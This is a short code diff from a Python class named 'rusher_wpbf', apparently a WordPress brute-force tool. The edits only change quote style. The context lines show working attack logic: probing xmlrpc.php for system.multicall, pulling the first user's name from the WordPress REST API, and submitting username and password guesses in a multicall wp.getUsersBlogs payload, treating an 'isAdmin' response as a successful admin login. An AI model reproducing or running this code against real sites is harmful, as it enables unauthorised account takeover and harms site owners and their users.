@@ -32,7 +32,7 @@ class rusher_wpbf:
         try:
 
             xmldata = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>'
-            x = requests.post(url="{}/xmlrpc.php".format(target), data=xmldata, headers={ "User-Agent": self.useragent(), 'Content-Type': 'application/xml' }, timeout=5)
+            x = requests.post(url="{}/xmlrpc.php".format(target), data=xmldata, headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=5)
 
             if '<methodResponse>' in x.text:
 
@@ -50,7 +50,7 @@ class rusher_wpbf:
 
         try:
 
-            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent(), 'Content-Type': 'application/xml' }, timeout=5)
+            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=5)
             return x.json()['name']
 
         except:
@@ -62,7 +62,7 @@ class rusher_wpbf:
         try:
 
             xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
-            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent(), 'Content-Type': 'application/xml' }, data=xml, timeout=5)
+            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, data=xml, timeout=5)
 
             if "<name>isAdmin</name>" in x.text:
 
